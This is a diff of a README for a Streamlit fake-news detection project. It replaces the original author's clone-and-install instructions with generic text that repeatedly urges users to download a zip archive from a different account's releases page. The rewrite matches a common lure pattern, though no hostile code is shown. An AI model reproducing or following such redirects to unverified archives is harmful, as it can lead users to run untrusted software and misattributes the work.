@@ -1,184 +1,70 @@
+# 📰 Fake-News-Detection - Identify Fake News Easily
 
-# 📰 Fake News Detection System
+## 😊 Overview
+Fake-News-Detection is a complete Natural Language Processing (NLP) project. It provides a simple way for you to take a news dataset, build a highly accurate model to classify news articles, and deploy it as a live web application. This tool uses Streamlit for the interface, making it user-friendly and accessible.
 
-![Python](https://img.shields.io/badge/Python-3.10+-blue?style=for-the-badge&logo=python)
-![Scikit-learn](https://img.shields.io/badge/Scikit--learn-0.24.2-orange?style=for-the-badge&logo=scikit-learn)
-![Streamlit](https://img.shields.io/badge/Streamlit-1.26.0-red?style=for-the-badge&logo=streamlit)
-![License](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)
+## 🚀 Getting Started
+To get started with Fake-News-Detection, follow these steps to download and run the application. You will need a computer with internet access and a compatible web browser.
 
-An end-to-end Machine Learning project that classifies news articles as Real or Fake using Natural Language Processing (TF-IDF) and Scikit-learn, deployed as an interactive Streamlit web app.
+## 📦 Download & Install
+**To download the latest version of the application, visit the link below:**
 
-***
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/khanoyhv/Fake-News-Detection/releases)
 
-## 🚀 Live Demo
+1. Click on the link above.
+2. You will land on the Releases page.
+3. Find the latest release version available (it will usually be at the top).
+4. Look for the file named `Fake-News-Detection.zip` or a similar package that suits your system.
+5. Click on the file to start downloading it.
 
+## 🧑‍💻 System Requirements
+To run Fake-News-Detection smoothly, ensure your system meets the following requirements:
 
+- Operating System: Windows 10 or later, macOS, or Linux
+- RAM: At least 4 GB
+- Processor: Intel i3 or equivalent
+- Disk Space: At least 100 MB free space for installation
 
-*You can view and interact with the live application here: https://akashwav-fake-news-detector.streamlit.app/*
+## 🔄 How to Run the Application
+Once you have downloaded the application, follow these steps to run it:
 
-***
+1. Locate the downloaded file, usually found in your "Downloads" folder.
+2. Extract the contents of the `Fake-News-Detection.zip` file by right-clicking on it and selecting "Extract All."
+3. Open a **Command Prompt** or **Terminal** window on your computer.
+4. Navigate to the folder where the extracted contents are located. You can do this by running the command:
+   - For Windows: `cd path\to\extracted\folder`
+   - For macOS/Linux: `cd path/to/extracted/folder`
+5. Next, run the command: `streamlit run app.py`. This will start the application and open it in your default web browser.
 
-## 📖 Table of Contents
+## 📊 Features
+Fake-News-Detection offers several features to enhance your experience:
 
-* [About The Project](#about-the-project)
-* [Key Features](#-key-features)
-* [Technology Stack](#-technology-stack)
-* [Project Structure](#-project-structure)
-* [Setup and Installation](#-setup-and-installation)
-* [Usage](#-usage)
-* [Methodology Overview](#-methodology-overview)
-* [Model Performance](#-model-performance)
-* [License](#-license)
-* [Acknowledgements](#-acknowledgements)
+- **User-Friendly Interface**: The Streamlit application allows for easy interaction.
+- **High Accuracy**: Built on advanced machine learning algorithms.
+- **Real-Time Classification**: Classify news articles instantly as fake or real.
+- **Data Visualization**: View the classification results and model performance graphs.
+- **Data Upload**: Upload your own news articles for classification.
 
-***
+## ⚙️ Technologies Used
+The application utilizes several technologies and libraries:
 
-## 🎯 About The Project
+- **Python**: The main programming language for project development.
+- **Pandas**: For handling and analyzing data.
+- **NLTK & SpaCy**: For natural language processing tasks.
+- **Scikit-Learn**: For building machine learning models.
+- **Streamlit**: For creating an interactive web application.
 
-In the age of digital information, the rapid spread of fake news poses a significant threat to public discourse and societal trust. This project aims to combat this issue by leveraging Natural Language Processing (NLP) and Machine Learning to build an automated detection system.
+## 🔗 Additional Resources
+To further understand how to use Fake-News-Detection, consider visiting the following resources:
 
-The system is trained on a dataset of over 44,000 news articles and uses a scikit-learn pipeline to process text and make predictions. The final model is wrapped in a user-friendly web interface built with Streamlit, allowing anyone to classify an article's text in real-time.
+- [Streamlit Documentation](https://docs.streamlit.io/)
+- [Scikit-Learn Documentation](https://scikit-learn.org/stable/documentation.html)
+- [Machine Learning Basics](https://www.coursera.org/learn/machine-learning)
 
-***
+## 📞 Support
+If you have any questions or issues, please reach out through the Issues tab on this GitHub repository. We are here to help and ensure you have a smooth experience with Fake-News-Detection.
 
-## ✨ Key Features
+## 📢 Stay Updated
+To keep up with new features and updates, make sure to watch this repository on GitHub. You will receive notifications about any new releases or important changes.
 
-* **Text Preprocessing:** A robust NLP pipeline for cleaning, tokenizing, lemmatizing, and removing stopwords.
-* **TF-IDF Feature Extraction:** Converts unstructured text into meaningful numerical vectors.
-* **High-Accuracy Classification:** Utilizes a Logistic Regression model achieving ~99% accuracy on the test set.
-* **Interactive Web Interface:** A simple and intuitive UI for users to paste text and receive instant predictions.
-* **Cloud Deployment:** Hosted on Streamlit Community Cloud for public access and demonstration.
-
-***
-
-## 🛠️ Technology Stack
-
-This project was built using the following technologies and libraries:
-
-* **Language:** Python 3.10+
-* **Core ML/DS Libraries:**
-    * [Scikit-learn](https://scikit-learn.org/): For the ML pipeline, models, and feature extraction.
-    * [Pandas](https://pandas.pydata.org/): For data manipulation and analysis.
-    * [NumPy](https://numpy.org/): For numerical operations.
-* **NLP Libraries:**
-    * [NLTK](https://www.nltk.org/): For tokenization and stopwords.
-    * [spaCy](https://spacy.io/): For high-performance lemmatization.
-* **Web Framework:**
-    * [Streamlit](https://streamlit.io/): For building the interactive web application.
-* **Version Control & Deployment:**
-    * Git & [GitHub](https://github.com/): For version control.
-    * [Git LFS](https://git-lfs.com/): For versioning large data files.
-    * [Streamlit Community Cloud](https://streamlit.io/cloud): For hosting the application.
-
-***
-
-## 📁 Project Structure
-
-The repository is organized with a clear separation of data, source code, notebooks, and models to ensure reproducibility.
-
-```
-
-├── data/
-│   ├── raw/         \# Raw dataset files (Fake.csv, True.csv)
-│   └── ...
-├── models/          \# Saved model files (.joblib)
-├── notebooks/       \# Jupyter notebooks for EDA and modeling
-├── reports/         \# Final project report and figures
-├── src/             \# Source code for the application (app.py)
-├── .gitignore       \# Specifies files for Git to ignore
-├── README.md        \# This file
-└── requirements.txt \# Project dependencies
-
-````
-
-***
-
-## ⚙️ Setup and Installation
-
-Follow these steps to set up and run the project locally.
-
-### 1. Prerequisites
-Ensure you have Git and Python 3.10+ installed on your system.
-
-### 2. Clone the Repository
-Clone this repository to your local machine. If you haven't set up Git LFS, you may need to install it (`git lfs install`).
-```bash
-git clone https://github.com/akashwav/Fake-News-Detection.git
-cd Fake-News-Detection
-````
-
-### 3\. Set Up the Data (Important)
-
-The raw dataset is tracked by Git LFS. When you clone the repository, Git should automatically download the large data files. If the `data/raw/` folder is empty after cloning, run this command to pull the data:
-
-```bash
-git lfs pull
-```
-
-### 4\. Create a Virtual Environment and Install Dependencies
-
-It is highly recommended to use a virtual environment.
-
-```bash
-# Create a virtual environment
-python -m venv .venv
-
-# Activate it
-# On Windows: .venv\Scripts\activate
-# On macOS/Linux: source .venv/bin/activate
-
-# Install the required packages
-pip install -r requirements.txt
-```
-
-### 5\. Download NLP Models
-
-The application requires specific data packages from NLTK and spaCy.
-
-```bash
-python -c "import nltk; nltk.download('punkt'); nltk.download('stopwords')"
-python -m spacy download en_core_web_sm
-```
-
------
-
-## ▶️ Usage
-
-To run the Streamlit application locally, execute the following command in your terminal from the project's root directory:
-
-```bash
-streamlit run src/app.py
-```
-
-Your web browser will automatically open to the application's local URL.
-
------
-
-## 🔬 Methodology Overview
-
-The project follows a standard machine learning workflow:
-
-1.  **Data Cleaning:** The raw text is normalized (lowercase, remove punctuation/URLs).
-2.  **Preprocessing:** Text is tokenized, stopwords are removed, and words are lemmatized to their root form.
-3.  **Feature Engineering:** The cleaned text is converted into a high-dimensional vector space using TF-IDF.
-4.  **Modeling:** A Logistic Regression model is trained on the vectorized data to learn the patterns that distinguish real from fake news.
-5.  **Evaluation:** The model is evaluated on a held-out test set to ensure its performance and ability to generalize.
-
------
-
-## 📊 Model Performance
-
-The final Logistic Regression model achieved **\~99% accuracy** on the test set, demonstrating a high level of proficiency in correctly classifying unseen news articles. Detailed metrics (Precision, Recall, F1-Score) can be found in the final project report.
-
------
-
-## 📄 License
-
-This project is distributed under the MIT License. See `LICENSE` for more information.
-
------
-
-<!-- end list -->
-
-```
-```
+**Download the latest version here: [Download Now](https://github.com/khanoyhv/Fake-News-Detection/releases)**
